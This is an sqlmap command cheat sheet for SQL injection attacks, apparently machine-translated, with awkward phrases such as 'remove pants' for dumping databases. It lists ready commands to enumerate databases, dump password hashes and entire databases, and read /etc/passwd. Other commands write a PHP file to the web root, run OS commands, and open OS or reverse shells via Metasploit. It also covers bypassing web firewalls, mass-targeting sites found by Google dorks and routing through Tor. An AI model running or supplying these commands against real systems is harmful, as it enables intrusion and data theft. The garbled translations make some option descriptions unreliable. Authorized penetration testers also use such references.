# SQLMAP CMD

**Basic usage**
```
./sqlmap -u "inject address" --dbs // enumerate database
./sqlmap -u "inject address" --current-db // current database
./sqlmap -u "inject address" --users // column database user
./sqlmap -u "inject address" --current-user // current user
./sqlmap -u "inject address" --tables -D "database" // enumerate the table name of the database
./sqlmap -u "inject address" --columns -T "table name" -D "database" // get the column name of the table
./sqlmap -u "inject address" --dump -C "field, field" -T "table name" -D "database" // get the data in the table, including the column, is the pants
```

**submit using the POsT method**
```
sqlmap -u "http://192.168.1.1/sqlmap/oracle/post_int.php" --method POsT --data "id=1"
sqlmap -u "https://xxxxx//search.aspx" --forms --batch --crawl=10  --dbms=MssQL --dbs --current-db  --technique=BEUsT --risk=3 --level=3
```

**Read the database version, current user, current database**
```
sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1
```

**Determine the current database user permissions**
```
sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U username-v 1 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U username-v 1
```

**Read the passwords of all database users or specified database users**
```
sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 
sqlmap-u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2
```

**Get all the databases**
```
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2
```
**Get all the tables in the specified database**
```
sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2
```

**Get the field of the specified table in the specified database name**
```
sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2
```

**Get the data of the specified field in the specified table in the specified database name** 
```
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C "username,password" -s "sqlnmapdb.log" -v 2
```

**file-read read web file**
```
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read "/etc/passwd" -v 2
```

**file-write writes files to the web**
```
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file-dest /var/www/html/xx.php -v 2
```

**union Query table record**
```
sqlmap -u "http://url/news?id=1" --union-cols 
```

**Get the current user name**
```
sqlmap -u "http://url/news?id=1" --current-user
```

**Get the current database name**
```
sqlmap -u "http://www.xxoo.com/news?id=1" --current-db 
```

**listname**
```
sqlmap -u "http://www.xxoo.com/news?id=1" --tables -D "db_name" 
```

**column field**
```
sqlmap -u "http://url/news?id=1" --columns -T "tablename" users-D "db_name" -v 0 
```

**Get the field contents**
```
sqlmap -u "http://url/news?id=1" --dump -C "column_name" -T "table_name" -D "db_name" -v 0
```

**smart smart level Execution test level**
```
sqlmap -u "http://url/news?id=1" --smart --level 3 --users
```

**dbms specify database type**
```
sqlmap -u "http://url/news?id=1" --dbms "Mysql" --users
```

**column database user**
```
sqlmap -u "http://url/news?id=1" --users
```

**Access to information**
```
sqlmap -u "http://url/news?id=1" --dbms "Mysql" --users		# dbms specify database type
sqlmap -u "http://url/news?id=1" --users 					#column database user
sqlmap -u "http://url/news?id=1" --dbs						#column database
sqlmap -u "http://url/news?id=1" --passwords				#database user password
sqlmap -u "http://url/news?id=1" --passwords -U root -v 0   #list the password of the specified user database
sqlmap -u "http://url/news?id=1" --dump -C "password,user,id" -T "tablename" -D "db_name" --start 1 --stop 20  #list designation Field, list 20
sqlmap -u "http://url/news?id=1" --dump-all -v 0 			#List all tables in all databases
sqlmap -u "http://url/news?id=1" --privileges 				#View Permissions
sqlmap -u "http://url/news?id=1" --privileges -U root		#View specified user permissions
sqlmap -u "http://url/news?id=1" --is-dba -v 1 				#is it a database administrator?
sqlmap -u "http://url/news?id=1" --roles 					#enumrate database user roles
sqlmap -u "http://url/news?id=1" --udf-inject 				#Import user-defined functions (get system privileges!)
sqlmap -u "http://url/news?id=1" --dump-all --exclude-sysdbs -v 0 #list out all tables in the current library
sqlmap -u "http://url/news?id=1" --union-cols 				#union Query table record
sqlmap -u "http://url/news?id=1" --cookie "COOKIE_VALUE" 	#cookie injection
sqlmap -u "http://url/news?id=1" -b 						#Get banner information
sqlmap -u "http://url/news?id=1" --data "id=3" 				#postinjection
sqlmap -u "http://url/news?id=1" -v 1 -f 					#fingerprint database type
sqlmap -u "http://url/news?id=1" --proxy "http://127.0.0.1:8118" # Agent injection
sqlmap -u "http://url/news?id=1" --string "sTRING_ON_TRUE_PAGE" #specify keywords
sqlmap -u "http://url/news?id=1" --sql-shell 				#Execute the specified sql command
sqlmap -u "http://url/news?id=1" --file /etc/passwd
sqlmap -u "http://url/news?id=1" --os-cmd=whoami 			#Execute system commands
sqlmap -u "http://url/news?id=1" --os-shell					#system interactive shell
sqlmap -u "http://url/news?id=1" --os-pwn 					#bounce shell
sqlmap -u "http://url/news?id=1" --reg-read					# read win system registry
sqlmap -u "http://url/news?id=1" --dbs -o "sqlmap.log" 		# save the progress
sqlmap -u "http://url/news?id=1" --dbs -o "sqlmap.log" --resume # Restore saved progress
```

| -v parameter, level of detail, observe how sqlmap is trying to judge a point and read data

-----------------

**There are seven levels, the default is 1**
```
0, only show python errors and serious information.
 
1. Display basic information and warning information at the same time. (default)
 
2. Display debug information at the same time.
 
3. Display the injected payload at the same time.
 
4. Display HTTP requests at the same time.
 
5. Display the HTTP response header at the same time.
 
6. Display the HTTP response page at the same time.
```

**Use sqlmap to remove pants**

* The –dump parameter is used to remove the pants
* Add the whole -all (–dump-all) if you drag the whole
* specify the field specified in the specified table
```
sqlmap -u "http://xxx/index.php?id=1" --dump -D DBName -T TableName -C "id,username,password"

# Take off the entire pants:

sqlmap -u "http://xxx/index.php?id=1" -D DBName --dump-all
```

------------

**Advanced usage**

* -p name Multiple parameters such as index.php?n_id=1&name=2&data=2020 We want to specify the name parameter to inject
```
sqlmap -g "google syntax" --dump-all --batch #google search injection point automatically runs out all fields, you need to ensure that google.com can access normally
```

* --technique test specifies the type of injection\technology used

* Test all injection techniques by default without parameters
• B: Boolean based sQL blind
• E: based on error sql injection
• U: based on UNION injection
• s: stacked sql injection
• T: Time-based blind

* --tamper bypasses the WEB firewall (WAF) sqlmap by encoding by default with char()
* --tamper plugin directory \sqlmap-dev\tamper
```
sqlmap -u "http:// www.2cto.com /news?id=1" --smart --level 3 --users #smart Intelligent level execution test level
```

**Attack example**
```
sqlmap -u "http://url/news?id=1&submit=submit" --cookie="xxx" --string="surname" --dbms=mysql --user --password
```

**Request**

These options can be used to specify how to connect to the target URL :
```
--data=DATA Data string sent via POsT
--cookie=COOKIE				HTTP Cookie header
--cookie-urlencode			URL encoding generated by cookie injection
--drop-set-cookie			Ignore the set-Cookie header of the response
--user-agent=AGENT			specifies the HTTP User --Agent header
--random-agent				uses a randomly selected HTTP User --Agent header
--referer=REFERER			specifies the HTTP Referer header
--headers=HEADERs			Wrap separate, add other HTTP headers
--auth-type=ATYPE			HTTP authentication type (basic, digest or NTLM) (Basic, Digest or NTLM)
--auth-cred=ACRED			HTTP authentication credentials (username: password)
--auth-cert=ACERT			HTTP certificate (key_file, cert_file)
--proxy=PROXY				Connect to the target URL using an HTTP proxy
--proxy-cred=PCRED			HTTP Proxy Authentication Credentials (Username: Password)
--ignore-proxy				ignores the system default HTTP proxy
--delay=DELAY				The delay between each HTTP request in seconds
--timeout=TIMEOUT			Time to wait for the connection to time out (default is 30 seconds)
--retries=RETRIEs			Time to reconnect after connection timeout (default 3)
--scope=sCOPE				Regular expression for the filter target from the provided proxy log
--safe-url=sAFURL			The url address that is frequently accessed during the test.
--safe-freq=sAFREQ			Test request between visits, giving a secure URL
```

**Enumeration**

These options can be used to enumerate information about the back-end database management system, the structure and data in the tables. In addition, you can also run your own sQL statements.
```
-b, --banner				Retrieve the identity of the database management system
--current-user				retrieves the current user of the database management system
--current-db				retrieves the current database of the database management system
--is-dba					Detects whether the DBMs current user is DBA
--users 					enumerates database management system users
--passwords 				enumerates database management system user password hashes
--privileges 				enumerates permissions for database management system users
--roles						enumerates the roles of database management system users
--dbs						enumerates the database management system database
--tables					enumerates tables in the DBMs database
--columns					enumerates DBMs database table columns
--dump						dumps the entries in the database of the database management system
--dump-all					dumps entries in all DBMs database tables
--search 					search column(s), table(s) and/or database name(s)
-D DB 						The name of the database to be enumerated
-T TBL 						Database table to be enumerated
-C COL 						Database column to be enumerated
-U UsER						database user used for enumeration
--exclude-sysdbs			Exclude system database when enumerating tables
--start=LIMITsTART			The first query output goes into the search
--stop=LIMITsTOP 			The output of the last query goes into the search
--first=FIRsTCHAR			Character search for the first query output word
--last=LAsTCHAR				Output word character retrieval for the last query
--sql-query=QUERY			sQL statement to execute
--sql-shell					prompts interactive sQL shell
```

**Optimization**

These options can be used to optimize the performance of sqlMap.
```
-o 							turn on all optimization switches
--predict-output			predicts common query output
--keep-alive				uses a persistent HTTP(s) connection
--null-connection 			retrieves page length from no actual HTTP response body
--threads=THREADs			Maximum HTTP(s) request concurrency (default is 1)
-p TEsTPARAMETER 			testable parameters (s)
--dbms=DBMs					forces the backend DBMs to this value
--os=Os						forces the backend DBMs operating system to this value
--prefix=PREFIX				injection payload string prefix
--suffix=sUFFIX				injection payload string suffix
--tamper=TAMPER				Tampering with injected data using the given script(s)
```

**Detection**

These options can be used to specify how to parse and compare the contents of an HTTP response page when the sQL blinds.
```
--level=LEVEL				The level at which the test is performed (1-5, default is 1)
--risk=RIsK					Risk of performing tests (0-3, default is 1)
--string=sTRING				Matches the string when the query is valid
--regexp=REGEXP				Query regular expression on page when valid
--text-only					based only on text content comparison pages
```

**Techniques**

These options can be used to tune specific sQL injection tests.
```
--technique=TECH			 sQL injection technology test (default BEUsT)
--time-sec=TIMEsEC			 DBMs response delay time (default is 5 seconds)
--union-cols=UCOLs			 Queued range for testing UNION query injection
--union-char=UCHAR			 Character used to violently guess the number of columns
```

**Fingerprint (fingerprint)**
```
-f, –fingerprint 			Execute checks for extensive DBMs version fingerprints
```

**Brute force**

These options can be used to run brute force checks.
```
--common-tables				 check for the existence of a common table
--common-columns			 check for common columns
```

**User-defined function injection**

These options can be used to create user-defined functions.
```
--udf-inject				 injection user-defined function
--shared-lib=sHLIB 			 local path to the shared library
```

**File system access**

These options can be used to access the underlying file system of the backend database management system.
```
--file-read=RFILE 			Reads files from the backend database management system file system
--file-write=WFILE			Edit the local file on the backend database management system file system
--file-dest=DFILE 			The absolute path of the file management system write file to the backend
```

**Operating system access**

These options can be used to access the underlying operating system of the back-end database management system.
```
--os-shell					 interactive operating system shell
--os-pwn					 Get an OOB shell, meterpreter or VNC
--os-smbrelay				 Get an OOB shell, meterpreter or VNC with one click
--os-bof					 stored procedure buffer overflow exploit
--priv-esc					 database process user privilege
--msf-path=MsFPATH			 Metasploit Framework local installation path
--tmp-path=TMPPATH			 Absolute path to the remote temporary file directory
```

**Windows registry access**

These options can be used to access the backend database management system Windows registry.
```
--reg-read					 read a Windows registry key value
--reg-add					 writes a Windows registry key value data
--reg-del					 removes the Windows registry key
--reg-key=REGKEY			 Windows registry key
--reg-value=REGVAL			 Windows registry key value
--reg-data=REGDATA			 Windows registry key value data
--reg-type=REGTYPE			 Windows registry key value type
```
**General**

These options can be used to set some general working parameters.
```
-t 					TRAFFICFILE logs all HTTP traffic to a text file
-s 					sEssIONFILE saves and restores all data retrieved from the session file
--flush-session 	refresh the current target session file
--fresh-queries		ignores query results stored in session files
--eta				shows the estimated arrival time of each output
--update			Update sqlMap
--save				file save options to the INI configuration file
--batch				never asks for user input, using all default configurations.
```

**Miscellaneous (miscellaneous)**
```
--beep		 		 find reminders when sQL injection
--check-payload		 IDs detection test for injected payloads
--cleanup			 sqlMap concrete UDF and table cleanup DBMs
--forms				 parsing and testing form of target URL
--gpage=GOOGLEPAGE	 Use Google Dork results from the specified page number
--page-rank			 Google dork results show page rank (PR)
--parse-errors		 parse database management system error messages from the response page
--replicate			 copy dumped data to a sqlite3 database
--tor				 uses the default Tor (Vidalia / Privoxy / Polipo) proxy address
--wizard			 simple wizard interface for beginners
```